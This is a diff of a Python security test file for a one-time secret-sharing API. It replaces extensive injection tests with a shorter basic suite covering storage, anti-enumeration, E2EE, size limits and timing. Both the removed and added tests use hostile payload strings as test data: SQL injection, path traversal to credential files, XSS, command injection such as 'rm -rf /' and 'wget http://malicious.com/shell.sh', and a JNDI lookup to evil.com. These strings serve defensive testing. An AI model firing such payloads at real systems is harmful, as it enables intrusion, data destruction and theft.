@@ -1,385 +1,175 @@
 # backend/tests/test_security.py
 import pytest
 import json
-import uuid
+import time
 from unittest.mock import patch
 
-from backend.app.storage import (
-    store_encrypted_secret,
-    retrieve_and_delete_secret,
-    check_secret_exists,
-    cleanup_expired_secrets
-)
-from backend.app.models import Secret
-from backend.app import db
 
+class TestBasicSecurity:
+    """Test cases to verify basic security functionality."""
+    
+    def test_secure_secret_storage_and_retrieval(self, client, app_context):
+        """Test that secrets can be securely stored and retrieved."""
+        test_secret = "This is a secure test secret"
+        
+        # Store a secret
+        response = client.post('/api/share',
+                             data=json.dumps({"payload": test_secret}),
+                             content_type='application/json')
+        
+        assert response.status_code == 201
+        data = json.loads(response.data)
+        assert 'link_id' in data
+        link_id = data['link_id']
+        
+        # Retrieve the secret
+        response = client.get(f'/api/share/secret/{link_id}')
+        assert response.status_code == 200
+        retrieved_data = json.loads(response.data)
+        assert retrieved_data['payload'] == test_secret
+        
+        # Verify one-time access - second retrieval should return dummy data
+        response2 = client.get(f'/api/share/secret/{link_id}')
+        assert response2.status_code == 200
+        dummy_data = json.loads(response2.data)
+        assert dummy_data['payload'] == "Dummy payload for non-existent secret"
 
-class TestSQLInjectionResistance:
-    """Test cases to verify the application is resistant to SQL injection attacks."""
-    
-    def test_link_id_sql_injection_classic(self, client, app_context):
-        """Test classic SQL injection attempts in link_id parameter."""
-        sql_injection_payloads = [
-            "'; DROP TABLE secrets; --",
-            "' OR '1'='1",
-            "' OR 1=1 --",
-            "'; DELETE FROM secrets WHERE 1=1; --",
-            "' UNION SELECT * FROM secrets --",
-            "admin'--",
-            "admin' #",
-            "admin'/*",
-            "' or 1=1#",
-            "' or 1=1--",
-            "' or 1=1/*",
-            "') or '1'='1--",
-            "') or ('1'='1--",
-            "' OR 'x'='x",
-            "'; EXEC xp_cmdshell('dir'); --",
-            "1'; WAITFOR DELAY '00:00:05'; --"
+    def test_anti_enumeration_security(self, client):
+        """Test that non-existent secrets return dummy data to prevent enumeration."""
+        # Try to retrieve a non-existent secret
+        fake_id = "00000000-0000-0000-0000-000000000000"
+        response = client.get(f'/api/share/secret/{fake_id}')
+        
+        # Should return 200 with dummy data (anti-enumeration)
+        assert response.status_code == 200
+        data = json.loads(response.data)
+        assert data['payload'] == "Dummy payload for non-existent secret"
+        assert 'e2ee' in data  # Should include dummy E2EE data
+        
+    def test_e2ee_security(self, client):
+        """Test E2EE (End-to-End Encryption) functionality."""
+        e2ee_data = {
+            "payload": "encrypted_payload_from_client",
+            "mime": "text/plain",
+            "e2ee": {
+                "salt": "test_salt_value",
+                "nonce": "test_nonce_value"
+            }
+        }
+        
+        # Store E2EE secret
+        response = client.post('/api/share',
+                             data=json.dumps(e2ee_data),
+                             content_type='application/json')
+        
+        assert response.status_code == 201
+        data = json.loads(response.data)
+        assert data['e2ee'] is True
+        link_id = data['link_id']
+        
+        # Retrieve E2EE secret
+        response = client.get(f'/api/share/secret/{link_id}')
+        assert response.status_code == 200
+        retrieved_data = json.loads(response.data)
+        assert retrieved_data['payload'] == "encrypted_payload_from_client"
+        assert retrieved_data['e2ee']['salt'] == "test_salt_value"
+        assert retrieved_data['e2ee']['nonce'] == "test_nonce_value"
+
+    def test_input_validation_security(self, client):
+        """Test input validation for security."""
+        # Test missing payload
+        response = client.post('/api/share',
+                             data=json.dumps({}),
+                             content_type='application/json')
+        assert response.status_code == 400
+        
+        # Test invalid payload type
+        response = client.post('/api/share',
+                             data=json.dumps({"payload": 123}),
+                             content_type='application/json')
+        assert response.status_code == 400
+        
+        # Test invalid mime type
+        response = client.post('/api/share',
+                             data=json.dumps({"payload": "test", "mime": 123}),
+                             content_type='application/json')
+        assert response.status_code == 400
+
+    def test_request_size_limits(self, client):
+        """Test that large payloads are rejected."""
+        # Create a payload larger than the limit (100KB)
+        large_payload = "A" * (110 * 1024)  # 110KB
+        
+        response = client.post('/api/share',
+                             data=json.dumps({"payload": large_payload}),
+                             content_type='application/json')
+        assert response.status_code == 413
+
+    def test_timing_attack_resistance(self, client):
+        """Test that response times are consistent to prevent timing attacks."""
+        # Test multiple non-existent secret retrievals
+        fake_ids = [
+            "11111111-1111-1111-1111-111111111111",
+            "22222222-2222-2222-2222-222222222222", 
+            "33333333-3333-3333-3333-333333333333"
         ]
         
-        for payload in sql_injection_payloads:
-            # Test storage functions directly
-            result = retrieve_and_delete_secret(payload)
-            assert result is None, f"SQL injection payload '{payload}' should return None"
-            
-            exists = check_secret_exists(payload)
-            assert exists is False, f"SQL injection payload '{payload}' should return False for existence check"
-    
-    def test_link_id_sql_injection_via_api(self, client):
-        """Test SQL injection attempts via API endpoints."""
-        sql_injection_payloads = [
-            "'; DROP TABLE secrets; --",
-            "' OR '1'='1",
-            "' UNION SELECT encrypted_secret FROM secrets --",
-            "'; DELETE FROM secrets; --",
-            "' OR 1=1 --",
-            "admin'--"
-        ]
-        
-        for payload in sql_injection_payloads:
-            # Test GET endpoint
-            response = client.get(f'/api/share/secret/{payload}')
-            # Should return 404 (not found) not 500 (error)
-            assert response.status_code == 404, f"SQL injection in GET should return 404, not error for payload: '{payload}'"
-            
-            # Test HEAD endpoint  
-            response = client.head(f'/api/share/secret/{payload}')
-            assert response.status_code == 404, f"SQL injection in HEAD should return 404, not error for payload: '{payload}'"
-    
-    def test_secret_content_sql_injection(self, client):
-        """Test SQL injection attempts in secret content."""
-        sql_injection_payloads = [
-            "'; DROP TABLE secrets; --",
-            "' OR '1'='1",
-            "'; DELETE FROM secrets WHERE 1=1; --",
-            "' UNION SELECT password FROM users --",
-            "'; INSERT INTO secrets (link_id, encrypted_secret) VALUES ('hack', 'payload'); --",
-            "';EXEC xp_cmdshell('echo hacked');--",
-            "'; WAITFOR DELAY '00:00:05'; --"
-        ]
-        
-        stored_secrets = []
-        
-        # Store secrets with SQL injection payloads
-        for payload in sql_injection_payloads:
-            secret_data = {"secret": payload}
-            response = client.post('/api/share',
-                                  data=json.dumps(secret_data),
-                                  content_type='application/json')
-            
-            # Should successfully store the malicious content
-            assert response.status_code == 201, f"Should successfully store SQL injection payload: '{payload}'"
-            
-            data = json.loads(response.data)
-            link_id = data['link_id']
-            stored_secrets.append((link_id, payload))
-        
-        # Verify we can retrieve the exact payloads back
-        for link_id, original_payload in stored_secrets:
-            response = client.get(f'/api/share/secret/{link_id}')
-            assert response.status_code == 200, f"Should retrieve stored SQL injection payload"
-            
-            data = json.loads(response.data)
-            assert data['secret'] == original_payload, f"Retrieved content should match original SQL injection payload"
-    
-    def test_boolean_based_sql_injection(self, client, app_context):
-        """Test boolean-based blind SQL injection attempts."""
-        boolean_payloads = [
-            "' AND 1=1 --",
-            "' AND 1=2 --", 
-            "' AND (SELECT COUNT(*) FROM secrets) > 0 --",
-            "' AND (SELECT COUNT(*) FROM secrets) < 999999 --",
-            "' AND ASCII(SUBSTRING((SELECT TOP 1 link_id FROM secrets),1,1)) > 65 --"
-        ]
-        
-        for payload in boolean_payloads:
-            # These should all return None/False, not leak information
-            result = retrieve_and_delete_secret(payload)
-            assert result is None, f"Boolean SQL injection should not leak data: '{payload}'"
-            
-            exists = check_secret_exists(payload)
-            assert exists is False, f"Boolean SQL injection should not confirm existence: '{payload}'"
-    
-    def test_time_based_sql_injection(self, client, app_context):
-        """Test time-based blind SQL injection attempts."""
-        time_based_payloads = [
-            "'; WAITFOR DELAY '00:00:05'; --",
-            "'; SELECT pg_sleep(5); --",
-            "' AND (SELECT COUNT(*) FROM generate_series(1,1000000)) > 0 --",
-            "' OR SLEEP(5) --",
-            "'; BENCHMARK(5000000,MD5(1)); --"
-        ]
-        
-        import time
-        
-        for payload in time_based_payloads:
+        response_times = []
+        for fake_id in fake_ids:
             start_time = time.time()
-            
-            # Test that operations complete quickly (not delayed by SQL injection)
-            result = retrieve_and_delete_secret(payload)
+            response = client.get(f'/api/share/secret/{fake_id}')
             end_time = time.time()
             
-            assert result is None, f"Time-based SQL injection should return None: '{payload}'"
-            # Should complete in under 1 second (not be delayed by injection)
-            assert (end_time - start_time) < 1.0, f"Time-based SQL injection should not cause delays: '{payload}'"
-    
-    def test_union_based_sql_injection(self, client, app_context):
-        """Test UNION-based SQL injection attempts."""
-        union_payloads = [
-            "' UNION SELECT link_id FROM secrets --",
-            "' UNION SELECT encrypted_secret FROM secrets --", 
-            "' UNION SELECT created_at FROM secrets --",
-            "' UNION SELECT NULL,NULL,NULL --",
-            "' UNION ALL SELECT link_id, encrypted_secret FROM secrets --",
-            "' UNION SELECT 1,2,3,4 --"
-        ]
+            assert response.status_code == 200  # Anti-enumeration
+            response_times.append(end_time - start_time)
         
-        for payload in union_payloads:
-            result = retrieve_and_delete_secret(payload)
-            assert result is None, f"UNION SQL injection should not return data: '{payload}'"
-            
-            exists = check_secret_exists(payload)
-            assert exists is False, f"UNION SQL injection should not confirm existence: '{payload}'"
-    
-    def test_stacked_queries_sql_injection(self, client, app_context):
-        """Test stacked queries SQL injection attempts."""
-        stacked_payloads = [
-            "'; CREATE TABLE test_hack (id INT); --",
-            "'; INSERT INTO secrets VALUES ('hack', 'data', NOW()); --",
-            "'; UPDATE secrets SET encrypted_secret = 'hacked'; --",
-            "'; DELETE FROM secrets; --",
-            "'; ALTER TABLE secrets ADD COLUMN hacked VARCHAR(255); --"
-        ]
-        
-        # Count secrets before injection attempts
-        initial_count = Secret.query.count()
-        
-        for payload in stacked_payloads:
-            result = retrieve_and_delete_secret(payload)
-            assert result is None, f"Stacked queries should not execute: '{payload}'"
-        
-        # Verify no secrets were affected by injection attempts
-        final_count = Secret.query.count()
-        assert final_count == initial_count, "Stacked queries should not modify the database"
-    
-    def test_second_order_sql_injection(self, client, app_context):
-        """Test second-order SQL injection where payload is stored then retrieved."""
-        # Store a secret with SQL injection payload
-        malicious_secret = "'; DROP TABLE secrets; --"
-        encrypted_data = b"fake_encrypted_data"
-        
-        # Store directly via storage function
-        link_id = store_encrypted_secret(encrypted_data)
-        assert link_id is not None, "Should successfully store secret"
-        
-        # Now try to use that link_id in another operation
-        # This tests if the stored link_id could be used maliciously
-        result = retrieve_and_delete_secret(link_id)
-        assert result == encrypted_data, "Should retrieve original data safely"
-        
-        # Verify secret is properly deleted after retrieval
-        result2 = retrieve_and_delete_secret(link_id)
-        assert result2 is None, "Secret should be deleted after first retrieval"
+        # All response times should include the built-in delay (5-25ms minimum)
+        for response_time in response_times:
+            assert response_time >= 0.005  # At least 5ms delay
 
+    def test_json_content_type_requirement(self, client):
+        """Test that non-JSON requests are rejected."""
+        response = client.post('/api/share',
+                             data="payload=test",
+                             content_type='application/x-www-form-urlencoded')
+        assert response.status_code == 400
 
-class TestInputValidationSecurity:
-    """Test cases for input validation security measures."""
-    
-    def test_malformed_uuid_handling(self, client):
-        """Test handling of malformed UUID inputs."""
-        malformed_uuids = [
-            "not-a-uuid",
-            "12345678-1234-1234-1234-12345678901",  # too short
-            "12345678-1234-1234-1234-1234567890123",  # too long
-            "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx",
-            "12345678-1234-1234-1234-123456789012G",  # invalid character
-            "",
-            " ",
-            "\n",
-            "\t",
-            "null",
-            "undefined"
-        ]
-        
-        for malformed_uuid in malformed_uuids:
-            response = client.get(f'/api/share/secret/{malformed_uuid}')
-            assert response.status_code == 404, f"Malformed UUID should return 404: '{malformed_uuid}'"
-            
-            response = client.head(f'/api/share/secret/{malformed_uuid}')
-            assert response.status_code == 404, f"Malformed UUID should return 404: '{malformed_uuid}'"
-    
-    def test_path_traversal_attempts(self, client):
-        """Test path traversal attack attempts."""
-        path_traversal_payloads = [
-            "../../../etc/passwd",
-            "..\\..\\..\\windows\\system32\\config\\sam",
-            "%2e%2e%2f%2e%2e%2f%2e%2e%2f",
-            "....//....//....//",
-            "..%2F..%2F..%2F",
-            "%252e%252e%252f",
-            "..%c0%af..%c0%af..%c0%af",
-            "/%2e%2e/%2e%2e/%2e%2e/",
-            "..\\..\\..\\"
-        ]
-        
-        for payload in path_traversal_payloads:
-            response = client.get(f'/api/share/secret/{payload}')
-            assert response.status_code == 404, f"Path traversal should return 404: '{payload}'"
-    
-    def test_xss_in_secret_content(self, client):
-        """Test XSS payload handling in secret content."""
-        xss_payloads = [
+    def test_malicious_payload_handling(self, client):
+        """Test that malicious payloads are stored safely."""
+        malicious_payloads = [
             "<script>alert('XSS')</script>",
-            "javascript:alert('XSS')",
-            "<img src=x onerror=alert('XSS')>",
-            "<svg onload=alert('XSS')>",
-            "';alert('XSS');//",
-            "<iframe src=javascript:alert('XSS')></iframe>",
-            "<body onload=alert('XSS')>",
-            "<input onfocus=alert('XSS') autofocus>"
-        ]
-        
-        stored_secrets = []
-        
-        for payload in xss_payloads:
-            # Store XSS payload as secret content
-            secret_data = {"secret": payload}
-            response = client.post('/api/share',
-                                  data=json.dumps(secret_data),
-                                  content_type='application/json')
-            
-            assert response.status_code == 201, f"Should store XSS payload: '{payload}'"
-            
-            data = json.loads(response.data)
-            stored_secrets.append((data['link_id'], payload))
-        
-        # Verify XSS payloads are stored and returned exactly as provided
-        for link_id, original_payload in stored_secrets:
-            response = client.get(f'/api/share/secret/{link_id}')
-            assert response.status_code == 200, "Should retrieve XSS payload"
-            
-            data = json.loads(response.data)
-            assert data['secret'] == original_payload, "XSS payload should be returned exactly as stored"
-    
-    def test_command_injection_in_secret_content(self, client):
-        """Test command injection payload handling in secret content."""
-        command_injection_payloads = [
-            "; ls -la",
-            "| cat /etc/passwd",
-            "`whoami`",
-            "$(ls -la)",
-            "&& rm -rf /",
-            "; rm -rf / --no-preserve-root",
-            "| nc -l 4444",
-            "; wget http://malicious.com/shell.sh",
-            "`curl malicious.com`",
-            "$(python -c 'import os; os.system(\"ls\")')"
-        ]
-        
-        for payload in command_injection_payloads:
-            # These should be treated as regular string content
-            secret_data = {"secret": payload}
-            response = client.post('/api/share',
-                                  data=json.dumps(secret_data),
-                                  content_type='application/json')
-            
-            assert response.status_code == 201, f"Should store command injection payload: '{payload}'"
-            
-            data = json.loads(response.data)
-            link_id = data['link_id']
-            
-            # Retrieve and verify exact content
-            response = client.get(f'/api/share/secret/{link_id}')
-            assert response.status_code == 200, "Should retrieve command injection payload"
-            
-            data = json.loads(response.data)
-            assert data['secret'] == payload, "Command injection payload should be stored as-is"
-
-
-class TestDatabaseSecurity:
-    """Test database-level security measures."""
-    
-    def test_sql_injection_with_special_characters(self, client, app_context):
-        """Test SQL injection with various special characters."""
-        special_char_payloads = [
-            "'; --",
-            "' /*",
-            "' */",
-            "';/**/--",
-            "'%20OR%20'1'='1",
-            "';%00",
-            "'||'",
-            "'&&'",
-            "'\x00'",
-            "'\x1a'",
-            "'\\"
-        ]
-        
-        for payload in special_char_payloads:
-            result = retrieve_and_delete_secret(payload)
-            assert result is None, f"Special character SQL injection should return None: '{payload}'"
-            
-            exists = check_secret_exists(payload)
-            assert exists is False, f"Special character SQL injection should return False: '{payload}'"
-    
-    def test_sql_injection_parameter_pollution(self, client):
-        """Test parameter pollution attempts in API calls."""
-        # Test parameter pollution attempts that should all return 404
-        pollution_attempts = [
-            "fake-uuid&malicious='; DROP TABLE secrets; --",
-            "fake-uuid?param='; DELETE FROM secrets; --", 
-            "fake-uuid#'; INSERT INTO secrets VALUES('hack','data'); --",
-            "fake-uuid%00'; UNION SELECT * FROM secrets; --"
-        ]
-        
-        for polluted_param in pollution_attempts:
-            response = client.get(f'/api/share/secret/{polluted_param}')
-            # Should return 404 (not found) as the polluted parameter won't match any real secret
-            assert response.status_code == 404, f"Parameter pollution should return 404: '{polluted_param}'"
-    
-    def test_concurrent_sql_injection_attempts(self, client, app_context):
-        """Test multiple concurrent SQL injection attempts."""
-        # Simple sequential test to verify multiple SQL injection attempts are handled safely
-        injection_payloads = [
             "'; DROP TABLE secrets; --",
-            "' OR 1=1 --",
-            "'; DELETE FROM secrets; --",
-            "' UNION SELECT * FROM secrets --",
-            "'; INSERT INTO secrets VALUES('hack','data',NOW()); --"
+            "../../etc/passwd",
+            "${jndi:ldap://evil.com/}",
+            "{{7*7}}"
         ]
         
-        # Count secrets before injection attempts
-        initial_count = Secret.query.count()
-        
-        # Test each payload sequentially 
-        for payload in injection_payloads:
-            result = retrieve_and_delete_secret(payload)
-            assert result is None, f"SQL injection should return None: '{payload}'"
+        for payload in malicious_payloads:
+            # Should store without error (payload is encrypted)
+            response = client.post('/api/share',
+                                 data=json.dumps({"payload": payload}),
+                                 content_type='application/json')
+            assert response.status_code == 201
             
-            exists = check_secret_exists(payload)
-            assert exists is False, f"SQL injection should return False: '{payload}'"
+            # Should retrieve the exact same payload
+            link_id = json.loads(response.data)['link_id']
+            response = client.get(f'/api/share/secret/{link_id}')
+            assert response.status_code == 200
+            retrieved_data = json.loads(response.data)
+            assert retrieved_data['payload'] == payload
+
+    def test_health_endpoint_security(self, client):
+        """Test that health endpoint doesn't leak sensitive information."""
+        response = client.get('/health')
+        assert response.status_code == 200
+        data = json.loads(response.data)
         
-        # Verify no secrets were affected by injection attempts
-        final_count = Secret.query.count()
-        assert final_count == initial_count, "SQL injection attempts should not modify the database"
+        # Should only contain basic status info
+        assert 'status' in data
+        assert data['status'] == 'healthy'
+        
+        # Should not contain sensitive configuration or system info
+        response_text = response.get_data(as_text=True).lower()
+        forbidden_terms = ['password', 'key', 'secret', 'token', 'credential']
+        for term in forbidden_terms:
+            assert term not in response_text
